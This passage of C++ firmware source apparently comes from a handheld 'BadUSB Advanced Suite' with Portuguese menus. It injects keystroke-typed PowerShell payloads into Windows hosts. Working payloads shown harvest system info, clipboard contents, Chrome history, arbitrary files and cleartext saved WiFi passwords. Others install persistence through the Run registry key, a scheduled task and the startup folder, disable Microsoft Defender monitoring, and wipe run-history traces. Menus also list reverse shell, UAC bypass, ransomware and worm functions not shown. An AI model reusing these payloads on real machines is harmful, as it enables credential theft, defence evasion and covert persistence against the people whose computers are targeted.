                    "Start-Sleep 1; "
                    "Add-Content 'C:\\Users\\Public\\CONFIDENCIAL.txt' 'Documento confidencial - Nao compartilhar'";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Documento criado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void attentionGrabber() {
    badDrawHeader("Attention Grab", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Chamando atencao...");
    tft.fillScreen(TFT_YELLOW);
    tft.setTextDatum(TC_DATUM);
    tft.setTextSize(FM);
    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
    tft.drawCentreString("ATENCAO!", tftWidth / 2, tftHeight / 2, SMOOTH_FONT);
    delay(2000);
    tft.fillScreen(BAD_COLOR_BG);
    displaySuccess("Atencao chamada!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// 5. EXFILTRATION (7 functions)
// ============================================================================

void notepadExfil() {
    badDrawHeader("Notepad Exfil", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando exfil...");
    delay(3000);
    badOpenShell();
    String script = "echo 'Willy Exfil via Notepad' > C:\\Users\\Public\\exfil.txt; "
                    "echo 'Hostname:' >> C:\\Users\\Public\\exfil.txt; "
                    "hostname >> C:\\Users\\Public\\exfil.txt; "
                    "echo 'User:' >> C:\\Users\\Public\\exfil.txt; "
                    "whoami >> C:\\Users\\Public\\exfil.txt; "
                    "notepad.exe C:\\Users\\Public\\exfil.txt";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Exfil concluido!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void powershellExfil() {
    badDrawHeader("PS Exfil", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Exfiltrando...");
    delay(3000);
    badOpenShell();
    String script = "$data=@(); "
                    "$data+='Host: '+$env:COMPUTERNAME; "
                    "$data+='User: '+$env:USERNAME; "
                    "$data+='Time: '+$(Get-Date -Format 'yyyy-MM-dd HH:mm'); "
                    "$data -join [Environment]::NewLine | Out-File 'C:\\Users\\Public\\system_info.txt'";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Dados exfiltrados!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void browserExfil() {
    badDrawHeader("Browser Exfil", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Exfiltrando navegador...");
    delay(3000);
    badOpenShell();
    String script = "$chrome = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\"; "
                    "if(Test-Path $chrome) { Copy-Item $chrome\\History 'C:\\Users\\Public\\chrome_history.txt' -Force }";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Navegador exfiltrado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void wifiProfileExfil() {
    badDrawHeader("WiFi Exfil", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Exfiltrando WiFi...");
    delay(3000);
    badOpenShell();
    String script = "netsh wlan show profiles | Select-String 'Perfil' | ForEach-Object { "
                    "$name = ($_ -split ':\\s+')[1]; "
                    "$pass = netsh wlan show profile name=$name key=clear | Select-String 'Conteudo da chave' | "
                    "ForEach-Object { ($_ -split ':\\s+')[1] }; "
                    \"$name + ':' + $pass | Out-File 'C:\\Users\\Public\\wifi_passwords.txt' -Append}\";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("WiFi exfiltrado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void clipboardExfil() {
    badDrawHeader("Clipboard Exfil", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Capturando clipboard...");
    delay(3000);
    badOpenShell();
    String script = "Get-Clipboard | Out-File 'C:\\Users\\Public\\clipboard.txt'";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Clipboard exfiltrado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void systemInfoExfil() {
    badDrawHeader("SysInfo Exfil", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Coletando info...");
    delay(3000);
    badOpenShell();
    String script = "systeminfo > 'C:\\Users\\Public\\systeminfo.txt'; "
                    "ipconfig /all >> 'C:\\Users\\Public\\systeminfo.txt'; "
                    "tasklist >> 'C:\\Users\\Public\\systeminfo.txt'";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Info coletada!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void fileExfil() {
    badDrawHeader("File Exfil", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    String path = num_keyboard("C:\\Users\\Public", 50, "Caminho:");
    badDrawFooter("Exfiltrando...");
    delay(3000);
    badOpenShell();
    String script = "Copy-Item '" + path + "' 'C:\\Users\\Public\\exfil\\' -Recurse -Force -ErrorAction SilentlyContinue";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Arquivos exfiltrados!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// 6. PERSISTENCE & STEALTH (7 functions)
// ============================================================================

void startupPersist() {
    badDrawHeader("Startup Persist", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Instalando persistencia...");
    delay(3000);
    badOpenShell();
    String script = "$s=(Get-StartupFolder); "
                    "Copy-Item $PSCommandPath \"$s\\update.bat\" -Force";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Persistencia instalada!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void scheduledTaskPersist() {
    badDrawHeader("Task Persist", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Criando tarefa...");
    delay(3000);
    badOpenShell();
    String script = "$A = New-ScheduledTaskAction -Execute 'notepad.exe'; "
                    "$T = New-ScheduledTaskTrigger -AtLogOn; "
                    "Register-ScheduledTask -TaskName 'WilyUpdate' -Action $A -Trigger $T -Force";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Tarefa criada!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void registryPersist() {
    badDrawHeader("Registry Persist", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Modificando registro...");
    delay(3000);
    badOpenShell();
    String script = "New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WilyUpdate' -Force; "
                    "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WilyUpdate' -Value 'notepad.exe'";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Registro modificado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void stealthMode() {
    badDrawHeader("Stealth Mode", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badUSBAdvConfig.stealthMode = true;
    displaySuccess("Modo stealth ativado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void antiDetection() {
    badDrawHeader("Anti-Detection", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Executando anti-det...");
    delay(3000);
    badOpenShell();
    String script = "Set-MpPreference -DisableRealtimeMonitoring $true; "
                    "Set-MpPreference -DisableBehaviorMonitoring $true; "
                    "Set-MpPreference -DisableBlockAtFirstSeen $true";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Anti-detecao executado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void cleanupTraces() {
    badDrawHeader("Cleanup Traces", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Limpando rastros...");
    delay(3000);
    badOpenShell();
    String script = "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -Force; "
                    "Clear-RecycleBin -Force -ErrorAction SilentlyContinue";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Rastros limpos!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void selfDestruct() {
    badDrawHeader("Self Destruct", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    if (!badConfirmAction("Tem certeza?")) return;
    badDrawFooter("Auto-destruindo...");
    delay(3000);
    badOpenShell();
    String script = "Remove-Item -Path $PSCommandPath -Force";
    badSendString(script.c_str());
    badusbHid->press(KEY_RETURN);
    badusbHid->releaseAll();
    displaySuccess("Self-destruct executado!");
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// 7. UTILITY & TESTING (7 functions)
// ============================================================================

void hidBenchTest() {
    badDrawHeader("HID Benchmark", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Testando performance...");
    int count = 1000;
    unsigned long start = millis();
    for (int i = 0; i < count; i++) {
        badusbHid->press('a');
        badusbHid->releaseAll();
    }
    unsigned long elapsed = millis() - start;
    float rate = (float)count / (elapsed / 1000.0f);
    tft.setTextSize(FP);
    tft.setTextColor(BAD_COLOR_TEXT, BAD_COLOR_BG);
    tft.drawString("Teclas: " + String(count), 12, BAD_BODY_Y);
    tft.drawString("Tempo: " + String(elapsed) + "ms", 12, BAD_BODY_Y + 14);
    tft.drawString("Taxa: " + String(rate, 1) + " keys/s", 12, BAD_BODY_Y + 28);
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void keyDelayTester() {
    badDrawHeader("Key Delay Test", BAD_COLOR_TITLE);
    if (!badInitHid()) return;
    badDrawFooter("Testando delays...");
    int delays[] = {0, 5, 10, 25, 50, 100};
    for (int d : delays) {
        unsigned long start = millis();
        for (int i = 0; i < 100; i++) {
            badusbHid->setDelay(d);
            badusbHid->press('a');
            badusbHid->releaseAll();
        }
        unsigned long elapsed = millis() - start;
        tft.setTextSize(FP);
        tft.setTextColor(BAD_COLOR_TEXT, BAD_COLOR_BG);
        tft.drawString("Delay " + String(d) + "ms: " + String(elapsed) + "ms", 12, BAD_BODY_Y + d * 8);
    }
    badusbHid->setDelay(badUSBAdvConfig.keyDelay);
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void layoutConverter() {
    badDrawHeader("Layout Converter", BAD_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(BAD_COLOR_TEXT, BAD_COLOR_BG);
    tft.drawString("Layout atual: " + String(badUSBAdvConfig.osTarget), 12, BAD_BODY_Y);
    tft.drawString("0=Windows 1=Mac 2=Linux 3=Auto", 12, BAD_BODY_Y + 14);
    badDrawFooter("SEL: Alterar  ESC: Voltar");
    while (true) {
        if (check(SelPress)) {
            badUSBAdvConfig.osTarget = (badUSBAdvConfig.osTarget + 1) % 4;
            tft.fillRect(12, BAD_BODY_Y, tftWidth - 24, 14, BAD_COLOR_BG);
            tft.setTextColor(BAD_COLOR_ACCENT, BAD_COLOR_BG);
            tft.drawString("Layout: " + String(badUSBAdvConfig.osTarget), 12, BAD_BODY_Y);
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void scriptValidator() {
    badDrawHeader("Script Validator", BAD_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(BAD_COLOR_TEXT, BAD_COLOR_BG);
    tft.drawString("Selecione script:", 12, BAD_BODY_Y);
    File root = SD.open("/");
    int count = 0;
    while (File entry = root.openNextFile()) {
        if (!entry.isDirectory() && String(entry.name()).endsWith(".txt")) {
            tft.drawString(entry.name(), 12, BAD_BODY_Y + 16 + count * 14);
            count++;
            if (count >= 5) break;
        }
        entry.close();
    }
    root.close();
    if (count == 0) tft.drawString("Nenhum script encontrado", 12, BAD_BODY_Y + 16);
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void connectionTest() {
    badDrawHeader("Connection Test", BAD_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(BAD_COLOR_TEXT, BAD_COLOR_BG);
    if (badusbHid && badusbHid->isConnected()) {
        tft.setTextColor(BAD_COLOR_ACCENT, BAD_COLOR_BG);
        tft.drawString("HID: CONECTADO", 12, BAD_BODY_Y);
    } else {
        tft.setTextColor(BAD_COLOR_DANGER, BAD_COLOR_BG);
        tft.drawString("HID: DESCONECTADO", 12, BAD_BODY_Y);
    }
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void payloadPreview() {
    badDrawHeader("Payload Preview", BAD_COLOR_TITLE);
    tft.setTextSize(FP);
    tft.setTextColor(BAD_COLOR_TEXT, BAD_COLOR_BG);
    tft.drawString("Shell: " + badUSBAdvConfig.defaultShell, 12, BAD_BODY_Y);
    tft.drawString("OS: " + String(badUSBAdvConfig.osTarget), 12, BAD_BODY_Y + 14);
    tft.drawString("Delay: " + String(badUSBAdvConfig.keyDelay) + "ms", 12, BAD_BODY_Y + 28);
    tft.drawString("Stealth: " + String(badUSBAdvConfig.stealthMode ? "ON" : "OFF"), 12, BAD_BODY_Y + 42);
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

void exportToSD() {
    badDrawHeader("Export to SD", BAD_COLOR_TITLE);
    if (!SD.begin()) {
        displayError("SD nao detectado");
        return;
    }
    String fname = "/badusb_log_" + String(millis()) + ".txt";
    File f = SD.open(fname, FILE_WRITE);
    if (f) {
        f.println("BadUSB Advanced Suite Log");
        f.println("Timestamp: " + String(millis()));
        f.println("OS Target: " + String(badUSBAdvConfig.osTarget));
        f.println("Key Delay: " + String(badUSBAdvConfig.keyDelay));
        f.println("Stealth: " + String(badUSBAdvConfig.stealthMode));
        f.close();
        displaySuccess("Salvo: " + fname);
    } else {
        displayError("Erro ao salvar");
    }
    badDrawFooter("Pressione ESC");
    while (!check(EscPress)) delay(100);
}

// ============================================================================
// MENU FUNCTIONS
// ============================================================================

void badusbKeyboardAtksMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Keylogger Exfil", "Reverse Shell", "UAC Bypass",
        "PS Obfuscator", "CMD Persist", "Ransomware Sim",
        "Cred Harvester", "Browser Exfil", "Clipboard Hijack", "Shutdown Loop"
    };
    int total = 10;
    badDrawHeader("KEYBOARD ATTACKS", BAD_COLOR_TITLE);
    badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = BAD_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            badDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : BAD_COLOR_TEXT, isSel ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                keyLoggerExfil, reverseShellBuilder, uacBypass,
                powershellObfuscator, cmdPersist, ransomwareSim,
                credHarvesting, browserDataExfil, clipboardHijacker, shutdownLoop
            };
            funcs[sel]();
            badDrawHeader("KEYBOARD ATTACKS", BAD_COLOR_TITLE);
            badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void badusbMouseAtksMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Mouse Jiggler", "Grid Pattern", "Random Walk",
        "Click Flood", "Drag Drop", "Mouse Drawing",
        "Scroll Jammer", "Mouse Evasion"
    };
    int total = 8;
    badDrawHeader("MOUSE ATTACKS", BAD_COLOR_TITLE);
    badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = BAD_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            badDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : BAD_COLOR_TEXT, isSel ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                mouseJiggler, mouseGridPattern, mouseRandomWalk,
                clickFlood, dragDropAttack, mouseDrawing,
                scrollJammmer, mouseEvasion
            };
            funcs[sel]();
            badDrawHeader("MOUSE ATTACKS", BAD_COLOR_TITLE);
            badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void badusbComboAtksMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Combo Key+Mouse", "Worm Propagation", "Multi-Stage",
        "Timed Payload", "Conditional Trigger", "Chained Cmds",
        "Auto Exploit", "Mass Infection"
    };
    int total = 8;
    badDrawHeader("COMBO ATTACKS", BAD_COLOR_TITLE);
    badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = BAD_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            badDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : BAD_COLOR_TEXT, isSel ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                comboKeyMouse, wormPropagation, multiStagePayload,
                timedPayload, conditionalTrigger, chainedCommands,
                autoExploit, massInfection
            };
            funcs[sel]();
            badDrawHeader("COMBO ATTACKS", BAD_COLOR_TITLE);
            badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void badusbSocialEngMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Fake Update", "Fake Login", "Fake Error",
        "Fake BSOD", "Popup Spam", "Fake Shutdown",
        "Decoy Document", "Attention Grab"
    };
    int total = 8;
    badDrawHeader("SOCIAL ENGINEERING", BAD_COLOR_TITLE);
    badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = BAD_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            badDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : BAD_COLOR_TEXT, isSel ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                fakeUpdateScreen, fakeLoginPrompt, fakeErrorDialog,
                fakeBlueScreen, popupSpam, fakeShutdown,
                decoyDocument, attentionGrabber
            };
            funcs[sel]();
            badDrawHeader("SOCIAL ENGINEERING", BAD_COLOR_TITLE);
            badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void badusbExfilMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Notepad Exfil", "PS Exfil", "Browser Exfil",
        "WiFi Exfil", "Clipboard Exfil", "SysInfo Exfil",
        "File Exfil"
    };
    int total = 7;
    badDrawHeader("EXFILTRATION", BAD_COLOR_TITLE);
    badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = BAD_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            badDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : BAD_COLOR_TEXT, isSel ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                notepadExfil, powershellExfil, browserExfil,
                wifiProfileExfil, clipboardExfil, systemInfoExfil,
                fileExfil
            };
            funcs[sel]();
            badDrawHeader("EXFILTRATION", BAD_COLOR_TITLE);
            badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void badusbPersistMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Startup Persist", "Task Persist", "Registry Persist",
        "Stealth Mode", "Anti-Detection", "Cleanup Traces",
        "Self Destruct"
    };
    int total = 7;
    badDrawHeader("PERSISTENCIA & STEALTH", BAD_COLOR_TITLE);
    badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = BAD_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            badDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : BAD_COLOR_TEXT, isSel ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                startupPersist, scheduledTaskPersist, registryPersist,
                stealthMode, antiDetection, cleanupTraces,
                selfDestruct
            };
            funcs[sel]();
            badDrawHeader("PERSISTENCIA & STEALTH", BAD_COLOR_TITLE);
            badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void badusbUtilityMenu() {
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "HID Benchmark", "Key Delay Test", "Layout Converter",
        "Script Validator", "Connection Test", "Payload Preview",
        "Export to SD"
    };
    int total = 7;
    badDrawHeader("UTILITARIOS", BAD_COLOR_TITLE);
    badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = BAD_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            badDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : BAD_COLOR_TEXT, isSel ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 14, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
        if (check(SelPress)) {
            void (*funcs[])() = {
                hidBenchTest, keyDelayTester, layoutConverter,
                scriptValidator, connectionTest, payloadPreview,
                exportToSD
            };
            funcs[sel]();
            badDrawHeader("UTILITARIOS", BAD_COLOR_TITLE);
            badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

void badusbConfigMenu() {
    int sel = 0;
    const char* items[] = {
        "OS Target", "Key Delay", "Default Delay",
        "Payload Delay", "Show Feedback", "Auto Close",
        "Shell Padrao", "Stealth Mode", "Export SD"
    };
    int total = 9;
    badDrawHeader("CONFIGURACOES", BAD_COLOR_TITLE);
    badDrawFooter("SEL: Alterar  UP/DOWN: Nav", "ESC: Voltar");
    while (true) {
        for (int i = 0; i < 9; i++) {
            int y = BAD_BODY_Y + i * 22;
            bool isSel = (i == sel);
            badDrawCard(y, 20, isSel);
            tft.setTextSize(FP);
            tft.setTextColor(isSel ? TFT_BLACK : BAD_COLOR_TEXT, isSel ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[i], 14, y + 5);
            tft.setTextDatum(TR_DATUM);
            String val;
            switch (i) {
                case 0: val = String(badUSBAdvConfig.osTarget == 0 ? "Windows" : badUSBAdvConfig.osTarget == 1 ? "Mac" : badUSBAdvConfig.osTarget == 2 ? "Linux" : "Auto"); break;
                case 1: val = String(badUSBAdvConfig.keyDelay) + " ms"; break;
                case 2: val = String(badUSBAdvConfig.defaultDelay) + " ms"; break;
                case 3: val = String(badUSBAdvConfig.payloadDelay) + " ms"; break;
                case 4: val = badUSBAdvConfig.showFeedback ? "ON" : "OFF"; break;
                case 5: val = badUSBAdvConfig.autoClose ? "ON" : "OFF"; break;
                case 6: val = badUSBAdvConfig.defaultShell; break;
                case 7: val = badUSBAdvConfig.stealthMode ? "ON" : "OFF"; break;
                case 8: val = badUSBAdvConfig.exportToSD ? "ON" : "OFF"; break;
            }
            tft.drawString(val, tftWidth - 14, y + 5);
            tft.setTextDatum(TL_DATUM);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; }
        if (check(SelPress)) {
            if (sel == 0) badUSBAdvConfig.osTarget = (badUSBAdvConfig.osTarget + 1) % 4;
            else if (sel == 1) {
                String d = num_keyboard(String(badUSBAdvConfig.keyDelay), 4, "Key Delay (ms):");
                badUSBAdvConfig.keyDelay = d.toInt();
            } else if (sel == 2) {
                String d = num_keyboard(String(badUSBAdvConfig.defaultDelay), 4, "Default Delay (ms):");
                badUSBAdvConfig.defaultDelay = d.toInt();
            } else if (sel == 3) {
                String d = num_keyboard(String(badUSBAdvConfig.payloadDelay), 5, "Payload Delay (ms):");
                badUSBAdvConfig.payloadDelay = d.toInt();
            } else if (sel == 4) badUSBAdvConfig.showFeedback = !badUSBAdvConfig.showFeedback;
            else if (sel == 5) badUSBAdvConfig.autoClose = !badUSBAdvConfig.autoClose;
            else if (sel == 6) badUSBAdvConfig.defaultShell = (badUSBAdvConfig.defaultShell == "powershell") ? "cmd" : "powershell";
            else if (sel == 7) badUSBAdvConfig.stealthMode = !badUSBAdvConfig.stealthMode;
            else if (sel == 8) badUSBAdvConfig.exportToSD = !badUSBAdvConfig.exportToSD;
            badDrawHeader("CONFIGURACOES", BAD_COLOR_TITLE);
            badDrawFooter("SEL: Alterar  UP/DOWN: Nav", "ESC: Voltar");
        }
        if (check(EscPress)) break;
        delay(100);
    }
}

// ============================================================================
// MAIN SUITE MENU
// ============================================================================

void badusbAdvancedSuiteMenu() {
    badDrawWelcomeScreen();
    int sel = 0, scrollY = 0;
    const char* items[] = {
        "Keyboard Attacks", "Mouse Attacks",
        "Combo Attacks", "Social Engineering",
        "Exfiltracao", "Persistencia & Stealth",
        "Utilitarios", "Configuracoes"
    };
    uint16_t colors[] = {TFT_CYAN, TFT_GREEN, TFT_ORANGE, TFT_MAGENTA, TFT_RED, TFT_YELLOW, TFT_WHITE, TFT_DARKGREY};
    const char* icons[] = {"K", "M", "C", "S", "E", "P", "U", "C"};
    int total = 8;
    badDrawFooter("SEL: OK  UP/DOWN: Nav  ESC: Voltar");
    while (true) {
        for (int i = 0; i < 7; i++) {
            int idx = scrollY + i;
            if (idx >= total) break;
            int y = BAD_BODY_Y + i * 22;
            bool isSel = (idx == sel);
            badDrawCard(y, 20, isSel);
            tft.fillCircle(24, y + 10, 7, colors[idx]);
            tft.setTextSize(FP); tft.setTextColor(TFT_BLACK, colors[idx]);
            tft.setTextDatum(TC_DATUM); tft.drawString(icons[idx], 24, y + 6, 1);
            tft.setTextDatum(TL_DATUM);
            tft.setTextColor(isSel ? TFT_BLACK : BAD_COLOR_TEXT, isSel ? BAD_COLOR_PRIMARY : getColorVariation(BAD_COLOR_PRIMARY, 4, -1));
            tft.drawString(items[idx], 36, y + 5);
        }
        if (check(UpPress)) { sel--; if (sel < 0) sel = total - 1; if (sel < scrollY) scrollY = sel; }
        if (check(DownPress)) { sel++; if (sel >= total) sel = 0; if (sel >= scrollY + 7) scrollY = sel - 6; }
